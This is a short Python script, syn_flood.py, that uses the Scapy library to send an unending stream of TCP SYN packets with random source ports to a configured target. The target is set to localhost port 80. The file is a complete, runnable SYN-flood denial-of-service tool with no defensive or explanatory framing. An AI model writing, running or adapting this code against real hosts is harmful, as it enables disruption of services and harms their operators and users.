# syn_flood.py
from scapy.all import *
import random
import time

target_ip = "127.0.0.1"  #
target_port = 80         #

def syn_flood():
    while True:
        ip = IP(dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535),
                  dport=target_port,
                  flags="S", seq=random.randint(1000, 9999))
        pkt = ip / tcp
        send(pkt, verbose=False)
        print(f"[DEBUG] Sent SYN packet to {target_ip}:{target_port}")
        time.sleep(0.01)

if __name__ == "__main__":
    print(f"[INFO] Starting SYN Flood to {target_ip}:{target_port}")
    syn_flood()
